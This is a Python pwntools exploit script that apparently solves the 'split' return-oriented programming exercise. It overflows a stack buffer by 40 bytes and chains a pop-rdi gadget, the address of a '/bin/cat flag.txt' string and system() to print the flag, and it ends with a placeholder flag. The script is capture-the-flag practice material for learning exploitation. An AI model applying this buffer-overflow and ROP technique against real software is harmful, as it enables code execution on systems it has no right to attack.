#!/usr/bin/python3
import pwn as p

'''
Basically, we need to jump to system, /bin/cat flag.txt is on the data segment. Need to create a chain to put the string into rdi register, then call it with system()
'''

def pwn():
    start = p.process('./split')
    payload = b'A'*40 #offset
    payload += p.p64(0x4007c3) #address of pop rdi ret gadget, to load the string into rdi registry
    payload += p.p64(0x601060) #address of /bin/cat flag.txt string
    payload += p.p64(0x400560) #address of system
    # send payload
    start.sendline(payload)
    start.interactive()

    # win
if __name__ == "__main__":
    pwn()
#Flag: ROPE{a_placeholder_32byte_flag!}
